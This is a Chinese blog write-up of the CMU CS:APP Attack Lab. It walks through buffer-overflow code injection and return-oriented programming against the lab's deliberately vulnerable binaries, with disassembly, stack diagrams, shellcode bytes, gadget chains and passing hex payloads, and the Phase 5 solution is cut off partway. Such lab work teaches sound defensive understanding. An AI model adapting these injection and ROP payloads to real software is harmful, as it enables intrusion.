# CS:APP Attack Lab: 缓冲区溢出攻击

原文发布于微信公众号 - 云服务与SRE架构师社区（ai-cloud-ops）

## 前言

CMU的15-213课程Introduction to Computer Systems (ICS)里面有一个实验叫attack lab，利用缓冲区溢出漏洞改变正常的程序运行行为，从而达到攻击的目的。关于这个lab的解题思路，网上已经有很多了，但我依然想要再来一篇。原因包括：

- 十年前我曾完成了这个lab的前身bufbomb(http://dev.poetpalace.org/?p=39)，这绝对是我在计算机行业中，乃至人生中最有趣以及最有成就感的体验之一。哪怕是十年后重温，依然如此。
- 面对冠状病毒的肆虐，我没什么可做的，但是我可以研究计算机病毒。*To be a good people you have to know what bad people do.*

> Computer Systems: A Programmer's Perspective(CS:APP)是为了这门课专门编写的教材，中文翻译为《深入理解计算机系统》。想想这门课的标题，Introduction？导论？好像哪里不太对。

## attach lab 说明

### 缓冲区溢出

所谓缓冲区溢出，是在历史遗留的C函数库中，存在一些函数不检查缓冲区大小，比如下面这个函数正常只能输入3个字符（不包括结尾的'\0')：

```c
void echo()
{
    char buf[4]; /* Way too small! */
    gets(buf);
    puts(buf);
}
```

当用户输入超过3个字符时，就可能破坏程序的帧栈结构，这一点恰恰为恶意攻击者利用。attack lab中使用了有漏洞的`Gets()`函数，并通过不同的编译参数编译了两个二进制文件：ctarget和rtarget。


### 代码注入攻击

ctarget没有启用任何保护措施，攻击者可以注入精心设计的二进制代码，并修改函数返回地址来运行这段代码，如下图所示：

![](https://raw.githubusercontent.com/4179e1/csapp/master/target1/res/inject.png)
> 图片来自CMU 15-213 的 *09-machine-advanced.pdf*

有几种措施可以预防这种攻击：

1. 操作系统提供了`Address space layout randomization (ASLR)`，随机初始化stack的起始位置，因此缓冲区的具体内存地址不再是确定的。没有这个地址就不能再跳回来执行。
2. CPU提供了`No eXecute`标记，用来标记内存段是`可读`、`可写`，还是`可执行` 的。只要编译器不给stack可执行标记，注入的代码就无法执行。
3. 编译器提供了`Stack Canary`，在缓冲区附近的一个内存中写入一随机的magic number，在返回前再读出这个magic number看看是否跟原来的一致。因为缓冲区溢出攻击会覆盖这段内存，其写入的值几乎不可能跟这个magic number相同。

### 面向返回(ROP)攻击

rtarget启用了`ASLR`和`No eXecute`标记，但是没有启用`Stack Canary`[1]。代码注入攻击对此无效，需要用到另一种叫做`Return-Oriented Programming（ROP)`攻击的技术。其核心思想是，既然我不能执行自己注入的代码，那么就从程序的TEXT断里面需要可以利用的机器代码片段(也叫做`Gadget`)，利用程序栈把一系列的`Gadget`串起来完成攻击，因此要求这些片段是在`retq`（x86的返回语句）之前。

比如这个不起眼的C函数：

```c
unsigned addval_219(unsigned x)
{
    return x + 2421715793U;
}
```

编译后的代码为：

```asm
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq

```

其中`0x4019ab`开始的`58 90 c3`刚好也可以解释为以下汇编语句。也就是把栈顶的元素传送到%rax这个寄存器。

```
   0:   58                      pop    %rax
   1:   90                      nop
   2:   c3                      retq   
```

当攻击者找到足够的`Gadget`，就可以利用缓冲区溢出漏洞把这些`Gadget`串联起来完成攻击，如下图所示：

![](https://raw.githubusercontent.com/4179e1/csapp/master/target1/res/rop.png)
> 图片来自CMU 15-213 的 *09-machine-advanced.pdf*

> [1] 读者朋友不妨思考下为什么没有启用Stack Canary？

### lab说明

lab分为5个Phase：
- Phase 1 到 3 需要利用代码注入攻击ctarget，劫持test()的返回地址，最终调用`touch1`到`touch3`3个函数。
- Phase 4 到 5 需要利用ROP攻击rtarget，劫持test()的返回地址，重复Phase 2 和 Phase 3的动作，分别调用`touch2`和`touch3`两个函数.

> 作为联系，rtarget提供了`farm.c`文件，里面包含很多有意构造的函数可以用来完成ROP攻击，现实中会远比这里困难。

## Phase 1

Phase 1 很简单，我们只要把test()的返回地址替换掉即可，通过反汇编和gdb单步调试，我们可以确定

- `getbuf()`会在栈上分配40(0x28)个字节
- `touch1()`的地址是`0x4017c0`

```
(gdb) disas getbuf
Dump of assembler code for function getbuf:
   0x00000000004017a8 <+0>:	sub    $0x28,%rsp
   0x00000000004017ac <+4>:	mov    %rsp,%rdi
   0x00000000004017af <+7>:	callq  0x401a40 <Gets>
   0x00000000004017b4 <+12>:	mov    $0x1,%eax
   0x00000000004017b9 <+17>:	add    $0x28,%rsp
   0x00000000004017bd <+21>:	retq   
End of assembler dump.

(gdb) disas touch1
Dump of assembler code for function touch1:
   0x00000000004017c0 <+0>:	sub    $0x8,%rsp
   0x00000000004017c4 <+4>:	movl   $0x1,0x202d0e(%rip)        # 0x6044dc <vlevel>
   0x00000000004017ce <+14>:	mov    $0x4030c5,%edi
   0x00000000004017d3 <+19>:	callq  0x400cc0 <puts@plt>
   0x00000000004017d8 <+24>:	mov    $0x1,%edi
   0x00000000004017dd <+29>:	callq  0x401c8d <validate>
   0x00000000004017e2 <+34>:	mov    $0x0,%edi
   0x00000000004017e7 <+39>:	callq  0x400e40 <exit@plt>
End of assembler dump.
```

下面是执行到`getbuf+0`时的栈结构

```
(gdb) x /8gx $rsp
0x5561dc78:     0x0000000000000000      0x0000000000000000
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000000000002      0x0000000000401f24
```


### stack layout

于是我们可以画出这个栈结构

> 怎么解读这个图？
> - 这个栈结构是倒过来画的，栈底（高位地址）在上，栈底（地位地址）在下
> - 左右也是反过来的，低位地址在左边，高位地址在右边。我们知道小端机器的数字不好读，但是左右颠倒之后，这些数字的顺序就符合人的习惯了。
> - 把这个表当作一个大的数组的话，起始元素在右下角，末尾元素在左上角。需要从右到左，从小到上开始读取。
> - 其中 **-** 表示未初始化的内存，里面是随机的值

| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                   |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---------------------- |
| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | what's that?           |
| 0x5561dcb8 | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | what's that?           |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main() |
| 0x5561dca8 | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 2    | test() stack           |
| 0x5561dca0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x19 | 0x76 | 0x401976 return test() |
| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack         |
| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -    | -    |                        |
| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -    | -    |                        |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    |                        |
| 0x5561dc78 | -    | -    | -    | -    | -    | -    | -    | -    | current %rsp           |


其中
- 0x5561dc78 开始的40字节是getbuf的栈
- 0x5561dca0 是调用者test()的返回地址
- 0x5561dca8 是test()的栈
- 0x5561dcb0 是main函数的返回地址
- 0x5561dcb8 及以上的地址未使用，后面可以用来做文章。

### Solution

Phase 1的解法很简单，只要把0x5561dca0上面的返回地址替换成touch1的0x4017c0就好了

| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                   |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---------------------- |
| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | what's that?           |
| 0x5561dcb8 | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 0    | what's that?           |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main() |
| 0x5561dca8 | 0    | 0    | 0    | 0    | 0    | 0    | 0    | 2    | test() stack           |
| 0x5561dca0 | '\0' | 0    | 0    | 0    | 0    | 0x40 | 0x17 | 0xc0 | <=== 修改这行          |
| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack         |
| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -    | -    |                        |
| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -    | -    |                        |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    |                        |
| 0x5561dc78 | -    | -    | -    | -    | -    | -    | -    | -    | current %rsp           |


我用0x2d（`-`的ascii表示）可以随意填充的值，那么按照正常从左到左，从上到下重新排列这个“数组”的话，需要写入缓冲区值是这样的：

```
2d 2d 2d 2d 2d 2d 2d 2d
2d 2d 2d 2d 2d 2d 2d 2d
2d 2d 2d 2d 2d 2d 2d 2d
2d 2d 2d 2d 2d 2d 2d 2d
2d 2d 2d 2d 2d 2d 2d 2d
c0 17 40 00 00 00 00
```

你会发现最后一行少了一个字节，因为`Get()`函数需要在最后补一个`\0`。

```bash
# cat result1 | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D C0 17 40 00 00 00 00 
```

40 pading bytes, and the return address 0x4017c0 (getbuf). the entire return address should be typed, as the Gets() place a '\0' at the end of input.

## Phase 2

Phase 2稍微复杂些，因为我们需要给%rdi传入一个`unsinged`类型，具体的值在handout的cookie.txt中，这里是

```bash
# cat cookie.txt 
0x59b997fa
```

通过反汇编，我们可以看到touch2的地址是0x4017ec：

```
(gdb) disas touch2
Dump of assembler code for function touch2:
   0x00000000004017ec <+0>:	sub    $0x8,%rsp
   0x00000000004017f0 <+4>:	mov    %edi,%edx
   0x00000000004017f2 <+6>:	movl   $0x2,0x202ce0(%rip)        # 0x6044dc <vlevel>
   0x00000000004017fc <+16>:	cmp    0x202ce2(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401802 <+22>:	jne    0x401824 <touch2+56>
   0x0000000000401804 <+24>:	mov    $0x4030e8,%esi
   0x0000000000401809 <+29>:	mov    $0x1,%edi
   0x000000000040180e <+34>:	mov    $0x0,%eax
   0x0000000000401813 <+39>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401818 <+44>:	mov    $0x2,%edi
   0x000000000040181d <+49>:	callq  0x401c8d <validate>
   0x0000000000401822 <+54>:	jmp    0x401842 <touch2+86>
   0x0000000000401824 <+56>:	mov    $0x403110,%esi
   0x0000000000401829 <+61>:	mov    $0x1,%edi
   0x000000000040182e <+66>:	mov    $0x0,%eax
   0x0000000000401833 <+71>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401838 <+76>:	mov    $0x2,%edi
   0x000000000040183d <+81>:	callq  0x401d4f <fail>
   0x0000000000401842 <+86>:	mov    $0x0,%edi
   0x0000000000401847 <+91>:	callq  0x400e40 <exit@plt>
End of assembler dump.
(gdb) 
```


### 生产注入代码

```bash
# cat 2.s
mov $0x59b997fa,%rdi
ret
# gcc -c 2.s
# objdump -d 2.o

2.o：     文件格式 elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   c3                      retq 
```

因此这里需要注入的代码是`48 c7 c7 fa 97 b9 59 c3`

### Solution

我们需要把栈结构改成这样：

| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                         |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---------------------------- |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main()       |
| 0x5561dca8 | '\0' | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x17 | 0xec | ret touch2()                 |
| 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 055  | 0x61 | 0xdc | 0x78 | ret 0x5561dc78 (inect code!) |
| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack               |
| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -    | -    |                              |
| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -    | -    |                              |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    |                              |
| 0x5561dc78 | 0xc3 | 0x59 | 0xb9 | 0x97 | 0xfa | 0xc7 | 0xc7 | 0x48 | mov $0x59b997fa,%rdi; ret    |

- 0x5561dc78 是刚生成的注入代码
- 然后我们需要把0x5561dca0的返回地址改成注入代码的地址0x5561dc78
- 0x5561dca8 则改成touch2的入口0x4017ec


```bash
# cat result2 | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 C3 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 78 DC 61 55 00 00 00 00 EC 17 40 00 00 00 00 
```

## Phase 3

Phase 3要求调用touch3，它需要我们在内存中放入一个跟cookie相同的字符串：

```python
# python
Python 2.7.14 (default, Oct 12 2017, 15:50:02) [GCC] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> s="59b997fa"
>>> for x in s: print ("%x" % ord(x))
... 
35
39
62
39
39
37
66
61
>>> 
```

因此这个字符串的二进制表示是`35 39 62 39 39 37 66 61`。

### 分析

这里看似跟Phase 2类似，但是这里touch3里面会调用hexmatch，如果我们把注入代码和cookie放在getbuf的栈中，cookie会被这两个函数推到栈中的内容覆盖，注意反汇编代码中`<=====`标注的几行都会修改栈的内容

```
(gdb) disassemble touch3
Dump of assembler code for function touch3:
   0x00000000004018fa <+0>:	push   %rbx                                                 <=====
   0x00000000004018fb <+1>:	mov    %rdi,%rbx
   0x00000000004018fe <+4>:	movl   $0x3,0x202bd4(%rip)        # 0x6044dc <vlevel>
   0x0000000000401908 <+14>:	mov    %rdi,%rsi 
   0x000000000040190b <+17>:	mov    0x202bd3(%rip),%edi        # 0x6044e4 <cookie>
   0x0000000000401911 <+23>:	callq  0x40184c <hexmatch>                              <=====
   0x0000000000401916 <+28>:	test   %eax,%eax
   0x0000000000401918 <+30>:	je     0x40193d <touch3+67>
   0x000000000040191a <+32>:	mov    %rbx,%rdx
   0x000000000040191d <+35>:	mov    $0x403138,%esi
   0x0000000000401922 <+40>:	mov    $0x1,%edi
   0x0000000000401927 <+45>:	mov    $0x0,%eax
   0x000000000040192c <+50>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401931 <+55>:	mov    $0x3,%edi
   0x0000000000401936 <+60>:	callq  0x401c8d <validate>
   0x000000000040193b <+65>:	jmp    0x40195e <touch3+100>
   0x000000000040193d <+67>:	mov    %rbx,%rdx
   0x0000000000401940 <+70>:	mov    $0x403160,%esi
   0x0000000000401945 <+75>:	mov    $0x1,%edi
   0x000000000040194a <+80>:	mov    $0x0,%eax
   0x000000000040194f <+85>:	callq  0x400df0 <__printf_chk@plt>
   0x0000000000401954 <+90>:	mov    $0x3,%edi
   0x0000000000401959 <+95>:	callq  0x401d4f <fail>
   0x000000000040195e <+100>:	mov    $0x0,%edi
   0x0000000000401963 <+105>:	callq  0x400e40 <exit@plt>
End of assembler dump.
(gdb) disas hexmatch
Dump of assembler code for function hexmatch:
   0x000000000040184c <+0>:	push   %r12                             # <=====
   0x000000000040184e <+2>:	push   %rbp                             # <=====
   0x000000000040184f <+3>:	push   %rbx                             # <=====
   0x0000000000401850 <+4>:	add    $0xffffffffffffff80,%rsp         # -128, rsp would now at 0x5561dc08
   0x0000000000401854 <+8>:	mov    %edi,%r12d
   0x0000000000401857 <+11>:	mov    %rsi,%rbp
   0x000000000040185a <+14>:	mov    %fs:0x28,%rax
   0x0000000000401863 <+23>:	mov    %rax,0x78(%rsp)              # <===== overwritten 0x5561dc80
   0x0000000000401868 <+28>:	xor    %eax,%eax
   0x000000000040186a <+30>:	callq  0x400db0 <random@plt>
   0x000000000040186f <+35>:	mov    %rax,%rcx
   0x0000000000401872 <+38>:	movabs $0xa3d70a3d70a3d70b,%rdx
   0x000000000040187c <+48>:	imul   %rdx
   0x000000000040187f <+51>:	add    %rcx,%rdx
   0x0000000000401882 <+54>:	sar    $0x6,%rdx
   0x0000000000401886 <+58>:	mov    %rcx,%rax
   0x0000000000401889 <+61>:	sar    $0x3f,%rax
   0x000000000040188d <+65>:	sub    %rax,%rdx
   0x0000000000401890 <+68>:	lea    (%rdx,%rdx,4),%rax
   0x0000000000401894 <+72>:	lea    (%rax,%rax,4),%rax
   0x0000000000401898 <+76>:	shl    $0x2,%rax
   0x000000000040189c <+80>:	sub    %rax,%rcx
   0x000000000040189f <+83>:	lea    (%rsp,%rcx,1),%rbx
   0x00000000004018a3 <+87>:	mov    %r12d,%r8d
   0x00000000004018a6 <+90>:	mov    $0x4030e2,%ecx
   0x00000000004018ab <+95>:	mov    $0xffffffffffffffff,%rdx
   0x00000000004018b2 <+102>:	mov    $0x1,%esi
   0x00000000004018b7 <+107>:	mov    %rbx,%rdi
   0x00000000004018ba <+110>:	mov    $0x0,%eax
   0x00000000004018bf <+115>:	callq  0x400e70 <__sprintf_chk@plt>
   0x00000000004018c4 <+120>:	mov    $0x9,%edx
   0x00000000004018c9 <+125>:	mov    %rbx,%rsi
   0x00000000004018cc <+128>:	mov    %rbp,%rdi
   0x00000000004018cf <+131>:	callq  0x400ca0 <strncmp@plt>
   0x00000000004018d4 <+136>:	test   %eax,%eax
   0x00000000004018d6 <+138>:	sete   %al
   0x00000000004018d9 <+141>:	movzbl %al,%eax
   0x00000000004018dc <+144>:	mov    0x78(%rsp),%rsi
   0x00000000004018e1 <+149>:	xor    %fs:0x28,%rsi
   0x00000000004018ea <+158>:	je     0x4018f1 <hexmatch+165>
   0x00000000004018ec <+160>:	callq  0x400ce0 <__stack_chk_fail@plt>
   0x00000000004018f1 <+165>:	sub    $0xffffffffffffff80,%rsp
   0x00000000004018f5 <+169>:	pop    %rbx
   0x00000000004018f6 <+170>:	pop    %rbp
   0x00000000004018f7 <+171>:	pop    %r12
   0x00000000004018f9 <+173>:	retq   
End of assembler dump.
(gdb) dias strncmp
Undefined command: "dias".  Try "help".
(gdb) disas strncmp
Dump of assembler code for function strncmp@plt:
   0x0000000000400ca0 <+0>:	jmpq   *0x203372(%rip)        # 0x604018 <strncmp@got.plt>
   0x0000000000400ca6 <+6>:	pushq  $0x3
   0x0000000000400cab <+11>:	jmpq   0x400c60
End of assembler dump.
(gdb) disas 0x400ca0
(gdb) disas 0x604018
Dump of assembler code for function strncmp@got.plt:
   0x0000000000604018 <+0>:	cmpsb  %es:(%rdi),%ds:(%rsi)
   0x0000000000604019 <+1>:	or     $0x40,%al
   0x000000000060401b <+3>:	add    %al,(%rax)
   0x000000000060401d <+5>:	add    %al,(%rax)
   0x000000000060401f <+7>:	add    %dh,0x400c(%rsi)
End of assembler dump.
(gdb) 
```

### Solution

如果我们不能把cookie放在getbuf的栈中，那就只能利用最顶层的main函数返回地址之前的未使用空间了，需要的栈结构如下：

| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                      |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------------------------- |
| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | '\0' | '\0' by Gets()            |
| 0x5561dcb8 | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39 | 0x35 | palce "59b997fa"          |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main()?   |
| 0x5561dca8 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x18 | 0xfa | ret touch3()              |
| 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 055  | 0x61 | 0xdc | 0x78 | ret 0x5561dc78 (stack!)   |
| 0x5561dc98 | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack            |
| 0x5561dc90 | -    | -    | -    | -    | -    | -    | -    | -    |                           |
| 0x5561dc88 | -    | -    | -    | -    | -    | -    | -    | -    |                           |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    | hexmatch+23 overwrite     |
| 0x5561dc78 | 0xc3 | 0x55 | 0x61 | 0xdc | 0x80 | 0xc7 | 0xc7 | 0x48 | mov $0x5561dcb8,%rdi; ret |

其中

- 0x5561dcb8 是我们要写入的cookie的二进制表示
- 0x5561dc78 是我们的注入代码，把cookie的地址复制到%rdi
- 0x5561dca0 跳转到我们的注入代码0x5561dc78
- 0x5561dca8 调用touch3

```
cat result3 | ./hex2raw | ./ctarget -q
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 C7 C7 B8 DC 61 55 C3 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 78 DC 61 55 00 00 00 00 FA 18 40 00 00 00 00 00 24 1F 40 00 00 00 00 00 35 39 62 39 39 37 66 61 
```

### Revisit

这里放上运行到hexmatch+23时的栈结构，来理解为什么这注入字符串要这么放。因为0x5561dca8到0x5561dc80之间的内容都会被覆盖。

| address    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                            |
| ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------------------------------- |
| 0x5561dcc0 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | '\0' | '\0' by Gets()                  |
| 0x5561dcb8 | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39 | 0x35 | cookie "59b997fa"               |
| 0x5561dcb0 | 0    | 0    | 0    | 0    | 0    | 0x40 | 0x1f | 0x24 | 0x401f24 return main()?         |
| 0x5561dca8 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | touch3() push %rbx              |
| 0x5561dca0 | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0x61 | touch3+28 call hexmatch()       |
| 0x5561dc98 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | hexmatch+0 push %r12            |
| 0x5561dc90 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | hexmatch+2 push %rbp            |
| 0x5561dc88 | ?    | ?    | ?    | ?    | ?    | ?    | ?    | ?    | hexmatch+3 push %rbx            |
| 0x5561dc80 | -    | -    | -    | -    | -    | -    | -    | -    | hexmatch+23 mov $rax,0x78(%rsp) |
| 0x5561dc78 | 0xc3 | 0x55 | 0x61 | 0xdc | 0x80 | 0xc7 | 0xc7 | 0x48 | mov $0x5561dc80,%rdi; ret       |
| ...        |      |      |      |      |      |      |      |      |                                 |
| 0x5561dc08 |      |      |      |      |      |      |      |      | %rsp after hexmatch+4           |


## Phase 4

Phase 4需要重复Phase 2的攻击，但是rtarget使用了两重防护:

- `ASLR`随机栈地址
- `No eXecute`标志禁用栈地址段的执行权限

因此代码注入攻击不再起作用，需要使用ROP攻击。解题思路是：

- 我们可以在栈上放cookie的值
- 从栈上把这个值pop到某个寄存器中
- 最终把这个寄存器中的值传入%rdi作为第一个参数，然后调用touch2

经过对代码的分析，我们找到了两个可用的`gadget`

### Gadgets 1

```asm
00000000004019a7 <addval_219>:
  4019a7:       8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
  4019ad:       c3                      retq

```

其中`0x4019ab`开始的`58 90 c3`可以解释为以下汇编语句

```
   0:   58                      pop    %rax
   1:   90                      nop
   2:   c3                      retq   
```

### Gadgets 2

```
00000000004019c3 <setval_426>:
  4019c3:       c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
  4019c9:       c3                      retq   
```

`0x4019c5`开始的`48 89 c7 90 c3`可以解释为以下汇编语句

```
   3:   48 89 c7                mov    %rax,%rdi
   6:   90                      nop
   7:   c3                      retq   
```

### Solution

这里解法是：

- 把Cookie的值放到栈里面 
- 通过`Gadget 1`把这个值pop到%rax中
- 通过`Gadget 2`把%rax中的值复制到%rdi（参数1）中
- 调用touch2

| address | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note              |
| ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ----------------- |
| 72      | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | 0xf4 | untouched         |
| 64      | '\0' | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x17 | 0xec | ret touch2()      |
| 56      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xc5 | Gadget2 0x4019c6  |
| 48      | 0x00 | 0x00 | 0x00 | 0x00 | 0x59 | 0xb9 | 0x97 | 0xfa | cookie 0x59b997fa |
| 40      | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xab | Gadget1 0x4019ab  |
| 32      | -    | -    | -    | -    | -    | -    | -    | -    | getbuf() stack    |
| 24      | -    | -    | -    | -    | -    | -    | -    | -    |                   |
| 16      | -    | -    | -    | -    | -    | -    | -    | -    |                   |
| 8       | -    | -    | -    | -    | -    | -    | -    | -    |                   |
| 0       | -    | -    | -    | -    | -    | -    | -    | -    | current %rsp      |

> 注意，这里我们没法给出栈的绝对地址，只能以相对地址表示。上图中以buf的起始地址作为0.

- 40 Gadget1的地址，(%rsp) -> %rax
- 48 Cookie的值，用来pop到%rax
- 56 Gadget2的地址，%rax -> %rdi
- 64 touch2的地址

```
cat result4 | ./hex2raw | ./rtarget -q
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D 2D AB 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C6 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 
```

## Phase 5

Phase 5 需要重复Phase 3，我们需要在栈上放一个字符串(cookie)，并把这个字符串的地址作为参数传递给touch3()，这里的难点是rtarget编译时针对缓冲区溢出攻击做了防御：
栈的起始位置是随机的，因为无法预知字符串的地址。

### Gadgets

先来看看我们有什么Gadgets可用，其中`add_xy`是直接可用的，也是解题的核心

| id  | function   | address  | hex string     | asm                               | note                        |
| --- | ---------- | -------- | -------------- | --------------------------------- | --------------------------- |
| G0  | addval_190 | 0x401a06 | 48 89 e0 c3    | mov %rsp,%rax; retq               | 把%rsp的值复制到%rax        |
| G1  | setval_426 | 0x4019c5 | 48 89 c7 90 c3 | mov %rax,%rdi; nop; retq          | Phase 4的Gadage2            |
| G2  | addval_219 | 0x4019ab | 58 90 c3       | pop %rax; nop; retq               | Phase 4的Gadage1            |
| G3  | getval_481 | 0x4019dd | 89 c2 90 c3    | mov %eax,%edx; nop; retq          | 注意这里是movl，传送低4字节 |
| G4  | getval_159 | 0x401a34 | 89 d1 38 c9 c3 | mov %edx,%ecx; cmp %cl,%cl; retq  | 注意这里是movl，传送低4字节 |
| G5  | addval_189 | 0x401a27 | 89 ce 38 c0 c3 | mov %ecx, %esi; cmp %al,%al; retq | 注意这里是movl，传送低4字节 |
| G6  | add_xy     | 0x4019d6 | 48 8d 04 37 c3 | lea (%rdi,%rsi,1),%rax; retq      | 直接可用                    |

### 解题思路

解题思路是使用某个固定的偏移量把字符串放到%rsp的一个相对地址，然后根据%rsp的值和偏移量计算出绝对地址。

这可以通过调用`add_xy`完成，两个参数（%rdi，%rsi）可通过下面Gadget组合获得
1. (参数1): %rdi
    1. (G0): movq %rsp,%rax
    1. (G1): movq %rax,%rdi
1. (参数2): %rsi
    1. (G2): popq %rax
    1. (G3): movl %eax,%edx
    1. (G4): movl %edx,%ecx
    1. (G5): movl %ecx,%rsi

调用(G6)`add_xy`计算cookie的地址，结果在%eax中。 然后通过(G1)把%eax的值传送到%rdi（参数1）中，最后调用`touch3()`。

### Solution

| address | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    | note                                                    |
| ------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ------------------------------------------------------- |
| 128     | -    | -    | -    | -    | -    | -    | -    | '\0' | '\0' by Gets()                                          |
| 120     | 0x61 | 0x66 | 0x37 | 0x39 | 0x39 | 0x62 | 0x39 | 0x35 | cookie "59b997fa"                                       |
| 112     | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x18 | 0xfa | touch3(): 0x40a8fa                                      |
| 104     | 0x00 | 0x00 | 0x00 | 0x00 | 0x00 | 0x40 | 0x19 | 0xc5 | G1 0x4019c6: %rax -> %rdi                               |
